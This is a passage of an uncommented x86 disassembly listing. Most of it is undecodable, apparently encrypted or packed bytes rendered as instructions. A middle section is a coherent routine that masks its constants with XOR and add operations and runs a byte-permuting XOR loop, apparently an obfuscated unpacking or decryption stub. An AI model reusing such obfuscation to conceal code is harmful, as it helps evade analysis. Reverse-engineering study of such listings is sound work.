  40d9de:	xchg   edi,eax
  40d9df:	inc    ecx
  40d9e0:	mov    eax,ds:0x8b80db1f
  40d9e5:	fld    TBYTE PTR [esi-0x63]
  40d9e8:	dec    ebp
  40d9e9:	(bad)  
  40d9ea:	mov    ebx,0xe314b0f7
  40d9ef:	test   DWORD PTR [eax],edi
  40d9f1:	sar    DWORD PTR [eax+0x1068c4dc],cl
  40d9f7:	mov    ecx,0xc979ecb8
  40d9fc:	in     eax,dx
  40d9fd:	jge    0x40d9e8
  40d9ff:	retf   
  40da00:	scas   eax,DWORD PTR es:[edi]
  40da01:	imul   esp,DWORD PTR [ecx-0x77],0x5d
  40da05:	daa    
  40da06:	mov    cl,0xe2
  40da08:	pusha  
  40da09:	dec    ecx
  40da0a:	mov    ds:0xa4b9395a,al
  40da0f:	mov    dl,0xfe
  40da11:	fsubp  st(1),st
  40da13:	mov    edx,DWORD PTR [esp+ebx*4-0x45481628]
  40da1a:	iret   
  40da1b:	stc    
  40da1c:	sub    ebx,DWORD PTR [ebx+0x43]
  40da1f:	aas    
  40da20:	clc    
  40da21:	stc    
  40da22:	dec    ecx
  40da23:	jbe    0x40d9ac
  40da25:	pushf  
  40da26:	test   esp,edi
  40da28:	add    eax,0x67155610
  40da2d:	and    BYTE PTR [ebp-0xf],bl
  40da30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da31:	adc    al,0x36
  40da33:	fldcw  WORD PTR cs:[eax]
  40da36:	gs dec ebp
  40da38:	and    ah,dh
  40da3a:	das    
  40da3b:	or     eax,0xd3293c97
  40da40:	jmp    0x40da1b
  40da42:	scas   al,BYTE PTR es:[edi]
  40da43:	inc    ebp
  40da44:	out    dx,eax
  40da45:	call   0xb4ae:0xa395af4c
  40da4c:	mov    esp,0xcf725416
  40da51:	xor    ah,bl
  40da53:	repz ja 0x40da75
  40da56:	in     eax,0x41
  40da58:	dec    ebx
  40da59:	push   esp
  40da5a:	sub    BYTE PTR [edi],bh
  40da5c:	xchg   edx,eax
  40da5d:	imul   eax,DWORD PTR [ebx+0x57],0x2d6f300c
  40da64:	cmc    
  40da65:	and    ah,BYTE PTR [ebx]
  40da67:	jl     0x40da10
  40da69:	neg    ch
  40da6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da6c:	xchg   ebp,eax
  40da6d:	ss xchg ebx,edx
  40da70:	ret    0xcde8
  40da73:	test   DWORD PTR [ebx-0x39f9a66],0xc7bad112
  40da7d:	std    
  40da7e:	cmc    
  40da7f:	inc    ecx
  40da80:	inc    esi
  40da81:	stc    
  40da82:	dec    esp
  40da83:	retf   
  40da84:	(bad)  
  40da85:	mov    ds:0x8e38fe6a,al
  40da8a:	mov    ebx,0xa08b37b8
  40da8f:	push   ebp
  40da90:	fs inc ebx
  40da92:	jecxz  0x40da15
  40da94:	xchg   esp,eax
  40da95:	repnz dec edi
  40da97:	pop    ecx
  40da98:	push   es
  40da99:	mov    al,ds:0x5d18d3bd
  40da9e:	push   esp
  40da9f:	xchg   esp,eax
  40daa0:	jo     0x40da3a
  40daa2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40daa4:	push   0xb0695279
  40daa9:	repz cmp edi,ebp
  40daac:	pop    esi
  40daad:	test   al,0xab
  40daaf:	ficom  DWORD PTR [eax]
  40dab1:	pop    ss
  40dab2:	rol    BYTE PTR [ebx+0x24c475f6],1
  40dab8:	fs js  0x40daa2
  40dabb:	dec    edx
  40dabc:	hlt    
  40dabd:	popa   
  40dabe:	sbb    dl,bl
  40dac0:	pop    ss
  40dac1:	ds jo  0x40db2c
  40dac4:	pop    esi
  40dac5:	xor    DWORD PTR [edi],0x14851bab
  40dacb:	popa   
  40dacc:	nop
  40dacd:	cwde   
  40dace:	mov    dl,0x8f
  40dad0:	js     0x40da7f
  40dad2:	xchg   BYTE PTR [edx],dl
  40dad4:	(bad)  
  40dad5:	xor    eax,0xfbab3a0a
  40dada:	and    DWORD PTR [ecx-0x7a1e2481],edi
  40dae0:	inc    ebx
  40dae1:	cld    
  40dae2:	mov    ecx,0xe80016be
  40dae7:	push   0x53612d12
  40daec:	ins    DWORD PTR es:[edi],dx
  40daed:	mov    bh,0x77
  40daef:	popa   
  40daf0:	jmp    0x1422:0xf51fd2c5
  40daf7:	cmc    
  40daf8:	adc    BYTE PTR ds:0xda8a1c63,bh
  40dafe:	popf   
  40daff:	dec    ecx
  40db00:	adc    bh,BYTE PTR cs:[ebx]
  40db03:	in     eax,0x3a
  40db05:	pop    edi
  40db06:	rcr    BYTE PTR [ebx],cl
  40db08:	cmp    bh,BYTE PTR [edx+0x270efc5e]
  40db0e:	add    ah,BYTE PTR [eax]
  40db10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db11:	retf   
  40db12:	test   eax,0xe23a56ce
  40db17:	inc    esp
  40db18:	outs   dx,BYTE PTR ds:[esi]
  40db19:	in     al,dx
  40db1a:	pop    eax
  40db1b:	or     ecx,esp
  40db1d:	repz sti 
  40db1f:	repnz and eax,DWORD PTR [eax-0x75]
  40db23:	js     0x40dafa
  40db25:	jmp    0xa573:0xb6560c47
  40db2c:	dec    edx
  40db2d:	cmp    al,0x8f
  40db2f:	arpl   dx,bp
  40db31:	in     eax,dx
  40db32:	xchg   edi,eax
  40db33:	pop    edi
  40db34:	adc    eax,0xc1b32bb
  40db39:	and    eax,0xb7610c44
  40db3e:	pop    ebx
  40db3f:	data16 aas 
  40db41:	cs sahf 
  40db43:	call   0xf2e6fba5
  40db48:	cmp    DWORD PTR [ecx+0x46],eax
  40db4b:	cmp    dh,BYTE PTR [esi-0x790d6268]
  40db51:	jecxz  0x40db82
  40db53:	pusha  
  40db54:	push   cs
  40db55:	mov    al,ds:0xb4463a14
  40db5a:	or     al,0xc0
  40db5c:	out    dx,al
  40db5d:	jle    0x40db96
  40db5f:	sub    al,0x52
  40db61:	mov    ebp,0x84530ceb
  40db66:	xor    ebx,DWORD PTR [edi-0x90df492]
  40db6c:	push   es
  40db6d:	call   0x2889:0xc94e1717
  40db74:	fstp   QWORD PTR ds:0x43487ba6
  40db7a:	rcl    BYTE PTR [ebx-0x1ab9f67f],0x1
  40db81:	ret    
  40db82:	sbb    al,0x6e
  40db84:	xor    esp,DWORD PTR [esi-0x1]
  40db87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db88:	addr16 mov cl,0x29
  40db8b:	std    
  40db8c:	bound  ecx,QWORD PTR [ebx+0x342faf8b]
  40db92:	inc    edx
  40db93:	retf   0x39cd
  40db96:	fisttp WORD PTR [esi]
  40db98:	mov    al,BYTE PTR [ecx+0x656d91e4]
  40db9e:	nop
  40db9f:	lea    esi,[edi]
  40dba1:	jnp    0x40dbcb
  40dba3:	in     eax,0xb3
  40dba5:	out    0x28,eax
  40dba7:	adc    BYTE PTR [edx],ah
  40dba9:	cmp    al,BYTE PTR [edx-0x601eba95]
  40dbaf:	jmp    0xfbfd:0x4d30835e
  40dbb6:	int3   
  40dbb7:	jns    0x40dba1
  40dbb9:	mov    BYTE PTR [ebx],dh
  40dbbb:	mov    ah,0x95
  40dbbd:	outs   dx,BYTE PTR ds:[esi]
  40dbbe:	push   esp
  40dbbf:	mov    ecx,0xb9caee1f
  40dbc4:	mov    ds:0x5d2694c,eax
  40dbc9:	sbb    bh,BYTE PTR [ebx+0xb]
  40dbcc:	mov    cl,BYTE PTR [eax+0x50910143]
  40dbd2:	scas   eax,DWORD PTR es:[edi]
  40dbd3:	ds push eax
  40dbd5:	jae    0x40db63
  40dbd7:	stos   DWORD PTR es:[edi],eax
  40dbd8:	mov    bh,0xe9
  40dbda:	dec    esp
  40dbdb:	call   0x7718:0xe3087c29
  40dbe2:	lods   al,BYTE PTR ds:[esi]
  40dbe3:	adc    eax,0x630df76e
  40dbe8:	shl    DWORD PTR ds:[edi-0x9e6137b],cl
  40dbef:	and    edx,ecx
  40dbf1:	leave  
  40dbf2:	cmp    BYTE PTR [edi+eiz*8+0x74ea289c],cl
  40dbf9:	stos   BYTE PTR es:[edi],al
  40dbfa:	pop    eax
  40dbfb:	jge    0x40dc4b
  40dbfd:	jg     0x40dbbf
  40dbff:	mov    ah,0x84
  40dc01:	adc    BYTE PTR [ecx-0x6e],ah
  40dc04:	pusha  
  40dc05:	push   ss
  40dc06:	fisubr WORD PTR [ebx-0x58e4dce7]
  40dc0c:	pop    ss
  40dc0d:	add    DWORD PTR [ecx],ecx
  40dc0f:	mov    edx,0x2c2ac2d3
  40dc14:	xchg   ecx,eax
  40dc15:	sbb    esp,esi
  40dc17:	adc    eax,edx
  40dc19:	mov    bl,0x10
  40dc1b:	jnp    0x40dc4f
  40dc1d:	adc    eax,0x946fecb5
  40dc22:	mov    ch,0x38
  40dc24:	out    0x8f,eax
  40dc26:	xor    ah,BYTE PTR [edi+edi*1-0x32]
  40dc2a:	pusha  
  40dc2b:	fmul   DWORD PTR [ecx]
  40dc2d:	test   eax,0xc3c91e49
  40dc32:	inc    eax
  40dc33:	fdiv   DWORD PTR [ecx]
  40dc35:	mov    dh,0x44
  40dc37:	and    al,BYTE PTR [esi+0x44]
  40dc3a:	inc    eax
  40dc3b:	pop    edi
  40dc3c:	xor    bl,BYTE PTR [edi+0x5988964e]
  40dc42:	out    dx,al
  40dc43:	imul   ebx,DWORD PTR [esi-0x24e0edb5],0xffffffc1
  40dc4a:	dec    edx
  40dc4b:	or     eax,0x311d4132
  40dc50:	ins    DWORD PTR es:[edi],dx
  40dc51:	pop    ebx
  40dc52:	push   cs
  40dc53:	mov    esp,0x123fad5
  40dc58:	xchg   ebx,eax
  40dc59:	xchg   ebp,eax
  40dc5a:	loopne 0x40dc3b
  40dc5c:	and    BYTE PTR [ebp-0x6c],bl
  40dc5f:	or     esi,esp
  40dc61:	xchg   DWORD PTR [eax-0x516fb723],esp
  40dc67:	dec    esi
  40dc68:	sti    
  40dc69:	imul   ecx,DWORD PTR [ebx],0x20
  40dc6c:	xor    DWORD PTR [edi+0x50949fd3],edx
  40dc72:	xchg   al,bh
  40dc74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc75:	lods   al,BYTE PTR ds:[esi]
  40dc76:	stos   BYTE PTR es:[edi],al
  40dc77:	jge    0x40dc0a
  40dc79:	fidivr WORD PTR ds:0xc64ac13e
  40dc7f:	xor    BYTE PTR [esp+eiz*8+0x2f9da9d8],dh
  40dc86:	dec    edx
  40dc87:	ins    BYTE PTR es:[edi],dx
  40dc88:	bound  eax,QWORD PTR [eax]
  40dc8a:	and    bl,BYTE PTR cs:[edx-0x303d3b1d]
  40dc91:	push   edi
  40dc92:	loop   0x40dc34
  40dc94:	idiv   eax
  40dc96:	cld    
  40dc97:	sub    eax,0xaaf0758b
  40dc9c:	pop    es
  40dc9d:	push   ss
  40dc9e:	into   
  40dc9f:	dec    eax
  40dca0:	mov    edi,0x901456ca
  40dca5:	in     eax,0x9a
  40dca7:	adc    BYTE PTR [eax+0x1941ac36],cl
  40dcad:	fbstp  TBYTE PTR [esi-0x79aa19a5]
  40dcb3:	pop    ebx
  40dcb4:	xchg   BYTE PTR [edx],cl
  40dcb6:	ja     0x40dd22
  40dcb8:	test   DWORD PTR [edi-0x59],ebx
  40dcbb:	push   ebp
  40dcbc:	and    DWORD PTR [eax+0x68],ebp
  40dcbf:	hlt    
  40dcc0:	mov    ebp,0x8151e446
  40dcc5:	and    cl,BYTE PTR [eax]
  40dcc7:	fwait
  40dcc8:	add    al,0x63
  40dcca:	stc    
  40dccb:	cmc    
  40dccc:	add    ch,ah
  40dcce:	or     DWORD PTR [eax],ebx
  40dcd0:	in     eax,0x47
  40dcd2:	sbb    BYTE PTR [edx+ecx*8],bl
  40dcd5:	or     DWORD PTR [eax+esi*2+0x30dec8b4],edi
  40dcdc:	pop    es
  40dcdd:	into   
  40dcde:	mov    ds:0xa9e73610,al
  40dce3:	stc    
  40dce4:	mov    ecx,0x46f5f3b
  40dce9:	xchg   ebx,eax
  40dcea:	xchg   ebp,eax
  40dceb:	repz mov esp,0xe6c8bdeb
  40dcf1:	imul   edi,DWORD PTR [esi-0x44e2fa3d],0xfffffff5
  40dcf8:	pop    esp
  40dcf9:	and    edx,DWORD PTR [ebp-0x5860aad9]
  40dcff:	xchg   edx,eax
  40dd00:	scas   eax,DWORD PTR es:[edi]
  40dd01:	adc    ebx,0xfdec5577
  40dd07:	add    DWORD PTR [ecx+0x46a15a4a],ecx
  40dd0d:	sub    bh,BYTE PTR [edi+0x5a9db7d9]
  40dd13:	stc    
  40dd14:	out    dx,eax
  40dd15:	add    ebx,DWORD PTR [ecx-0x39]
  40dd18:	xchg   edx,eax
  40dd19:	push   cs
  40dd1a:	inc    ecx
  40dd1b:	or     dl,dh
  40dd1d:	jp     0x40dd10
  40dd1f:	or     eax,0xd1fff086
  40dd24:	fild   DWORD PTR [ebx+0x46]
  40dd27:	into   
  40dd28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd29:	jmp    0x9fd17bf5
  40dd2e:	in     al,0x2a
  40dd30:	pop    ecx
  40dd31:	push   ebp
  40dd32:	(bad)  
  40dd34:	mov    DWORD PTR [edx+0x137879bf],eax
  40dd3a:	add    ah,BYTE PTR [ecx+0x2ceba3fb]
  40dd40:	out    dx,eax
  40dd41:	jmp    0x40dd04
  40dd43:	stmxcsr DWORD PTR [ecx+0x75]
  40dd47:	hlt    
  40dd48:	loopne 0x40dd88
  40dd4a:	repz or eax,0xd8294517
  40dd50:	and    eax,0x4ac6bc11
  40dd55:	cs data16 jo 0x40ddb4
  40dd59:	pop    ss
  40dd5a:	mov    ss,esp
  40dd5c:	and    al,BYTE PTR [ebx]
  40dd5e:	mov    bh,0x45
  40dd60:	lods   al,BYTE PTR ds:[esi]
  40dd61:	dec    edx
  40dd62:	clc    
  40dd63:	mov    ch,0xe0
  40dd65:	xchg   esi,eax
  40dd66:	xchg   ebp,eax
  40dd67:	aam    0xa3
  40dd69:	pop    eax
  40dd6a:	mov    cl,0x30
  40dd6c:	aaa    
  40dd6d:	adc    al,0x9f
  40dd6f:	in     eax,dx
  40dd70:	xor    dl,BYTE PTR [edx+0x60]
  40dd73:	push   esp
  40dd74:	imul   esp,DWORD PTR [ecx+0x7a],0x96bf2f13
  40dd7b:	mov    dl,0x67
  40dd7d:	not    cl
  40dd7f:	loop   0x40ddd9
  40dd81:	das    
  40dd82:	sub    eax,0x66eb7fee
  40dd87:	cmp    edi,DWORD PTR [edx]
  40dd89:	jmp    0xf1fb:0x624c6b61
  40dd90:	lahf   
  40dd91:	push   esi
  40dd92:	mov    BYTE PTR [ebx-0x13],dh
  40dd95:	push   0xffffffef
  40dd97:	push   ebp
  40dd98:	pop    DWORD PTR [edx-0x17]
  40dd9b:	rcl    DWORD PTR [ebx+0x6c],1
  40dd9e:	dec    ebx
  40dd9f:	sub    DWORD PTR [eax],0xffffffdb
  40dda2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dda3:	xor    al,0x16
  40dda5:	popa   
  40dda6:	pop    es
  40dda7:	pop    ecx
  40dda8:	xor    DWORD PTR [ebx],ebp
  40ddaa:	in     al,dx
  40ddab:	fmul   QWORD PTR [ecx+0x23]
  40ddae:	jbe    0x40dd4f
  40ddb0:	mov    eax,ds:0x3346ca78
  40ddb5:	or     al,0x47
  40ddb7:	lea    esi,[edx]
  40ddb9:	adc    BYTE PTR [edx],0xe9
  40ddbc:	scas   al,BYTE PTR es:[edi]
  40ddbd:	pop    esi
  40ddbe:	inc    ecx
  40ddbf:	dec    ebx
  40ddc0:	lahf   
  40ddc1:	ja     0x40ddb2
  40ddc3:	pop    ebp
  40ddc4:	push   ecx
  40ddc5:	adc    ch,bl
  40ddc7:	dec    edi
  40ddc8:	idiv   DWORD PTR [ecx]
  40ddca:	mov    DWORD PTR [ebx],ebp
  40ddcc:	sahf   
  40ddcd:	cmp    DWORD PTR [ecx-0x15],0xffffffe2
  40ddd1:	sbb    esi,DWORD PTR [ebp+0x6d]
  40ddd4:	mov    dl,dh
  40ddd6:	ds aas 
  40ddd8:	sbb    edx,edx
  40ddda:	rcr    DWORD PTR [bx+si-0x4e90],0x35
  40dde0:	inc    edi
  40dde1:	add    BYTE PTR [esi+eiz*2-0x3f223859],ch
  40dde8:	cmp    DWORD PTR [eax+0x60],edx
  40ddeb:	out    dx,eax
  40ddec:	add    eax,0xef2169e2
  40ddf1:	rcl    BYTE PTR [ecx],1
  40ddf3:	int    0x60
  40ddf5:	jge    0x40dded
  40ddf7:	loopne 0x40ddf9
  40ddf9:	and    dl,BYTE PTR [ebx+0x7b4bf22d]
  40ddff:	aam    0xd9
  40de01:	mov    esp,0xaf43b364
  40de06:	mov    BYTE PTR [ecx],dh
  40de08:	xchg   esp,eax
  40de09:	enter  0x7e26,0x6c
  40de0d:	cmp    eax,edx
  40de0f:	ja     0x40dfca
  40de15:	mov    edx,DWORD PTR [ebp-0x10]
  40de18:	mov    eax,DWORD PTR [ebp-0x14]
  40de1b:	mov    ebx,DWORD PTR [ebp-0x28]
  40de1e:	sub    eax,edx
  40de20:	xor    ebx,esi
  40de22:	xor    edx,edx
  40de24:	add    ebx,edi
  40de26:	div    ebx
  40de28:	mov    DWORD PTR [ebp-0x8],eax
  40de2b:	mov    eax,DWORD PTR [ebp-0x2c]
  40de2e:	mov    edx,DWORD PTR [ebp-0x8]
  40de31:	xor    eax,esi
  40de33:	add    eax,edi
  40de35:	cmp    edx,eax
  40de37:	jbe    0x40de47
  40de3d:	mov    eax,DWORD PTR [ebp-0x2c]
  40de40:	xor    eax,esi
  40de42:	add    eax,edi
  40de44:	mov    DWORD PTR [ebp-0x8],eax
  40de47:	mov    eax,DWORD PTR [ebp-0x28]
  40de4a:	mov    edx,DWORD PTR [ebp-0x8]
  40de4d:	xor    eax,esi
  40de4f:	add    eax,edi
  40de51:	imul   eax,edx
  40de54:	mov    DWORD PTR [ebp-0x8],eax
  40de57:	mov    eax,DWORD PTR [ebp-0x3c]
  40de5a:	mov    edx,DWORD PTR [ebp-0x8]
  40de5d:	xor    eax,esi
  40de5f:	add    eax,edi
  40de61:	cmp    edx,eax
  40de63:	je     0x40dfb3
  40de69:	mov    eax,DWORD PTR [ebp-0x8]
  40de6c:	mov    DWORD PTR [ebp-0x20],eax
  40de6f:	mov    eax,DWORD PTR [ebp-0x10]
  40de72:	add    eax,DWORD PTR [ebp-0x40]
  40de75:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  40de7c:	mov    DWORD PTR [ebp-0x8],eax
  40de7f:	mov    eax,0xf89c85b9
  40de84:	mov    DWORD PTR [ebp-0x1c],eax
  40de87:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  40de8e:	mov    DWORD PTR [ebp-0x30],eax
  40de91:	mov    eax,DWORD PTR [ebp-0x24]
  40de94:	xor    eax,esi
  40de96:	add    eax,edi
  40de98:	jmp    0x40df67
  40de9d:	mov    DWORD PTR [ebp-0x48],0xf89c85be
  40dea4:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  40deab:	mov    eax,DWORD PTR [ebp-0x30]
  40deae:	mov    edx,DWORD PTR [ebp-0xc]
  40deb1:	xor    eax,esi
  40deb3:	add    eax,edi
  40deb5:	imul   eax,edx
  40deb8:	mov    edx,DWORD PTR [ebp-0x1c]
  40debb:	xor    edx,esi
  40debd:	add    eax,edx
  40debf:	mov    edx,DWORD PTR [ebp-0x8]
  40dec2:	mov    al,BYTE PTR [eax+edx*1+0x3272d9]
  40dec9:	mov    BYTE PTR [ebp-0x1],al
  40decc:	mov    eax,DWORD PTR [ebp-0x1c]
  40decf:	mov    edx,DWORD PTR [ebp-0x1c]
  40ded2:	xor    eax,esi
  40ded4:	xor    edx,esi
  40ded6:	lea    ebx,[eax+edx*1+0x64e5b2]
  40dedd:	mov    eax,DWORD PTR [ebp-0xc]
  40dee0:	xor    edx,edx
  40dee2:	div    ebx
  40dee4:	mov    eax,DWORD PTR [ebp-0x1c]
  40dee7:	xor    eax,esi
  40dee9:	add    eax,edi
  40deeb:	cmp    edx,eax
  40deed:	mov    eax,DWORD PTR [ebp-0x30]
  40def0:	mov    edx,DWORD PTR [ebp-0xc]
  40def3:	jne    0x40df0f
  40def9:	xor    eax,esi
  40defb:	add    eax,edi
  40defd:	imul   eax,edx
  40df00:	mov    edx,DWORD PTR [ebp-0x8]
  40df03:	movzx  eax,BYTE PTR [eax+edx*1]
  40df07:	mov    edx,DWORD PTR [ebp-0x48]
  40df0a:	jmp    0x40df20
  40df0f:	xor    eax,esi
  40df11:	add    eax,edi
  40df13:	imul   eax,edx
  40df16:	mov    edx,DWORD PTR [ebp-0x8]
  40df19:	movzx  eax,BYTE PTR [eax+edx*1]
  40df1d:	mov    edx,DWORD PTR [ebp-0x4c]
  40df20:	xor    edx,esi
  40df22:	lea    eax,[edx+eax*1+0x3272d9]
  40df29:	movzx  edx,BYTE PTR [ebp-0x1]
  40df2d:	xor    edx,eax
  40df2f:	mov    BYTE PTR [ebp-0x1],dl
  40df32:	mov    al,BYTE PTR [ebp-0x1]
  40df35:	mov    edx,DWORD PTR [ebp-0x30]
  40df38:	mov    ebx,DWORD PTR [ebp-0xc]
  40df3b:	xor    edx,esi
  40df3d:	add    edx,edi
  40df3f:	imul   edx,ebx
  40df42:	mov    ebx,DWORD PTR [ebp-0x1c]
  40df45:	xor    ebx,esi
  40df47:	add    edx,ebx
  40df49:	mov    ebx,DWORD PTR [ebp-0x8]
  40df4c:	mov    BYTE PTR [edx+ebx*1+0x3272d9],al
  40df53:	mov    eax,DWORD PTR [ebp-0x38]
  40df56:	mov    edx,DWORD PTR [ebp-0x1c]
  40df59:	xor    eax,esi
  40df5b:	xor    edx,esi
  40df5d:	add    eax,edi
  40df5f:	add    edx,edi
  40df61:	imul   eax,edx
  40df64:	add    eax,DWORD PTR [ebp-0xc]
  40df67:	mov    DWORD PTR [ebp-0xc],eax
  40df6a:	mov    eax,DWORD PTR [ebp-0xc]
  40df6d:	mov    edx,DWORD PTR [ebp-0x20]
  40df70:	sub    eax,edi
  40df72:	sub    edx,edi
  40df74:	xor    eax,esi
  40df76:	xor    edx,esi
  40df78:	cmp    edx,eax
  40df7a:	jne    0x40de9d
  40df80:	mov    eax,DWORD PTR [ebp-0x1c]
  40df83:	mov    edx,DWORD PTR [ebp-0x20]
  40df86:	xor    eax,esi
  40df88:	add    eax,edi
  40df8a:	imul   eax,edx
  40df8d:	mov    edx,DWORD PTR [ebp-0x24]
  40df90:	xor    edx,esi
  40df92:	add    edx,edi
  40df94:	or     eax,edx
  40df96:	mov    edx,DWORD PTR [ebp-0x18]
  40df99:	xor    edx,esi
  40df9b:	add    eax,edx
  40df9d:	mov    edx,DWORD PTR [ebp-0x18]
  40dfa0:	xor    edx,esi
  40dfa2:	add    eax,edx
  40dfa4:	mov    edx,DWORD PTR [ebp-0x10]
  40dfa7:	lea    eax,[eax+edx*1+0x64e5b2]
  40dfae:	jmp    0x40dfc2
  40dfb3:	mov    eax,DWORD PTR [ebp-0x18]
  40dfb6:	mov    edx,DWORD PTR [ebp-0x10]
  40dfb9:	xor    eax,esi
  40dfbb:	lea    eax,[eax+edx*1+0x3272d9]
  40dfc2:	mov    DWORD PTR [ebp-0x10],eax
  40dfc5:	jmp    0x40ba48
  40dfca:	mov    eax,DWORD PTR [ebp-0x34]
  40dfcd:	mov    edx,DWORD PTR [ebp+0xc]
  40dfd0:	xor    edx,esi
  40dfd2:	lea    ecx,[ecx+edx*1+0x3272d9]
  40dfd9:	lea    edx,[ecx-0x3272d9]
  40dfdf:	xor    edx,esi
  40dfe1:	cmp    edx,0xf89c95b6
  40dfe7:	jne    0x40b940
  40dfed:	mov    ecx,DWORD PTR [ebp+0x8]
  40dff0:	mov    edx,DWORD PTR [ebp+0xc]
  40dff3:	mov    ebx,DWORD PTR [ebp+0x8]
  40dff6:	xor    edx,esi
  40dff8:	mov    dl,BYTE PTR [edx+eax*1+0x3272d9]
  40dfff:	xor    ecx,esi
  40e001:	mov    cl,BYTE PTR [ecx+eax*1+0x3272d9]
  40e008:	xor    ebx,esi
  40e00a:	mov    BYTE PTR [ebx+eax*1+0x3272d9],dl
  40e011:	mov    edx,DWORD PTR [ebp+0xc]
  40e014:	xor    edx,esi
  40e016:	mov    BYTE PTR [edx+eax*1+0x3272d9],cl
  40e01d:	jmp    0x4103c6
  40e022:	jno    0x40e05d
  40e024:	loop   0x40e015
  40e026:	loop   0x40e013
  40e028:	inc    ebp
  40e029:	pop    ss
  40e02a:	jl     0x40e07c
  40e02c:	push   0x6a96372e
  40e031:	jne    0x40dfb4
  40e033:	shl    BYTE PTR [eax+0x60],1
  40e036:	hlt    
  40e037:	pop    edi
  40e038:	pusha  
  40e039:	pusha  
  40e03a:	or     al,0x5c
  40e03c:	mov    ecx,0x9cc51865
  40e041:	and    cl,bl
  40e043:	ss mov bl,0xc6
  40e046:	mov    ebx,0xc8082ae7
  40e04b:	pop    esi
  40e04c:	sar    dl,0x48
  40e04f:	arpl   WORD PTR [esi-0x25fdd683],dx
  40e055:	push   eax
  40e056:	lods   al,BYTE PTR ds:[esi]
  40e057:	jl     0x40e038
  40e059:	nop
  40e05a:	outs   dx,BYTE PTR ds:[esi]
  40e05b:	sbb    ax,WORD PTR [edx-0x512c9bfa]
  40e062:	les    ebx,FWORD PTR es:[esi+esi*8-0x2fbb2cc9]
  40e06a:	les    eax,FWORD PTR [edi+0x8]
  40e06d:	pusha  
  40e06e:	lods   al,BYTE PTR ds:[esi]
  40e06f:	ins    BYTE PTR es:[edi],dx
  40e070:	or     BYTE PTR [esi-0x2c],ch
  40e073:	mov    cl,0xbb
  40e075:	xchg   edi,eax
  40e076:	dec    ecx
  40e077:	inc    edx
  40e078:	and    eax,0xed7d28e1
  40e07d:	rcl    ebx,0x88
  40e080:	mov    bh,0xf0
  40e082:	nop
  40e083:	je     0x40e040
  40e085:	pop    eax
  40e086:	retf   
  40e087:	sahf   
  40e088:	test   DWORD PTR [edi+0x63],ebp
  40e08b:	mov    esp,esi
  40e08d:	cwde   
  40e08e:	in     eax,0x4d
  40e090:	(bad)  
  40e091:	cdq    
  40e092:	xchg   esp,eax
  40e093:	jge    0x40e09b
  40e095:	shr    DWORD PTR [ecx],0x5d
  40e098:	aas    
  40e099:	stos   BYTE PTR es:[edi],al
  40e09a:	test   eax,0x7fb3524a
  40e09f:	jne    0x40e048
  40e0a1:	cmp    esp,DWORD PTR [ecx]
  40e0a3:	sbb    dh,BYTE PTR [eax+0x35]
  40e0a6:	lahf   
  40e0a7:	fwait
  40e0a8:	cli    
  40e0a9:	cli    
  40e0aa:	shr    BYTE PTR [edi+edi*2],cl
  40e0ad:	test   eax,edx
  40e0af:	mov    DWORD PTR [eax+0x6a0c6c70],0xdde19ce1
  40e0b9:	push   eax
  40e0bb:	jecxz  0x40e0d0
  40e0bd:	jns    0x40e104
  40e0bf:	test   DWORD PTR [edi],esp
  40e0c1:	or     al,0x84
  40e0c3:	sbb    al,0x4d
  40e0c5:	mov    ?,WORD PTR [edi-0x22]
  40e0c8:	xchg   ebx,eax
  40e0c9:	jb     0x40e146
  40e0cb:	lea    esi,[eax-0x74]
  40e0ce:	mov    bh,0x57
  40e0d0:	adc    al,BYTE PTR [edi-0x39be4ded]
  40e0d6:	test   eax,0x1f28590e
  40e0db:	mov    al,0x45
  40e0dd:	mov    eax,0x2ab3225a
  40e0e2:	cmp    edi,ecx
  40e0e4:	imul   ebp,DWORD PTR [eax+0x150c7115],0xffffffd6
  40e0eb:	dec    ebx
  40e0ec:	arpl   WORD PTR [ebx],di
  40e0ee:	push   edi
  40e0ef:	ret    0xac55
  40e0f2:	mov    eax,ds:0x631a588c
  40e0f7:	xor    ch,bl
  40e0f9:	ins    DWORD PTR es:[edi],dx
  40e0fa:	and    ah,0x86
  40e0fd:	inc    ecx
  40e0fe:	dec    ebx
  40e0ff:	dec    ebx
  40e100:	scas   al,BYTE PTR es:[edi]
  40e101:	jle    0x40e0d4
  40e103:	push   es
  40e104:	pop    ebp
  40e105:	sbb    BYTE PTR [ebp-0x14],0xa0
  40e109:	jbe    0x40e0ed
  40e10b:	in     eax,dx
  40e10c:	dec    ebp
  40e10d:	jne    0x40e097
  40e10f:	sar    BYTE PTR [ebx-0x32],1
  40e112:	jns    0x40e126
  40e114:	in     eax,0xbd
  40e116:	lahf   
  40e117:	jmp    0x269b:0x9779a869
  40e11e:	xor    esi,DWORD PTR [ebp+0x4850214e]
  40e124:	call   0xe7d5:0x25f612ba
  40e12b:	enter  0xd6c,0x4f
  40e12f:	inc    eax
  40e130:	pushf  
  40e131:	out    0xcd,al
  40e133:	popf   
  40e134:	mov    al,ds:0x61d37e48
  40e139:	(bad)  ds:0xbfac381
  40e13f:	pop    edi
  40e140:	add    al,0x49
  40e142:	repz mov cs,WORD PTR [eax]
  40e145:	ss push esp
  40e147:	mov    BYTE PTR [edx-0x5e2ba2f7],bl
  40e14d:	jae    0x40e13f
  40e14f:	mov    dh,dh
  40e151:	addr16 into 
  40e153:	lods   eax,DWORD PTR ds:[esi]
  40e154:	and    DWORD PTR [edi],0xffffffad
  40e157:	mov    bh,0xc3
  40e159:	add    dl,BYTE PTR ds:0xd435d6f5
  40e15f:	outs   dx,DWORD PTR ds:[esi]
  40e160:	or     bl,BYTE PTR [ebx-0x1a]
  40e163:	jo     0x40e118
  40e165:	push   ebx
  40e166:	bound  eax,QWORD PTR [edx+0x42]
  40e169:	call   0x141f:0x745986de
  40e170:	cdq    
  40e171:	xchg   ecx,eax
  40e172:	mov    ebp,0x7084c480
  40e177:	mov    ebp,cr0
  40e17a:	fwait
  40e17b:	inc    ebp
  40e17c:	pop    esi
